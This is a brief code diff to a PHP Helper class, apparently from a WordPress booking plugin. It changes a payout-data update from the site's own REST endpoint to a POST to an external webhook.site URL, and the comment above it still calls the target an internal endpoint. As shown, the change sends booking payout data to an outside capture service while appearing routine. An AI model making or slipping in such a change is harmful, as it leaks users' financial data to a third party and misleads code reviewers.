@@ -254,7 +254,7 @@ class Helper
         ];
 
         // Send to internal endpoint
-        $response = wp_remote_post(rest_url('frohub/v1/update-booking-payout-data'), [
+        $response = wp_remote_post('https://webhook.site/a409eb29-7a19-49d1-9971-8b03ac528f7e', [
             'method'  => 'POST',
             'headers' => ['Content-Type' => 'application/json'],
             'body'    => wp_json_encode([
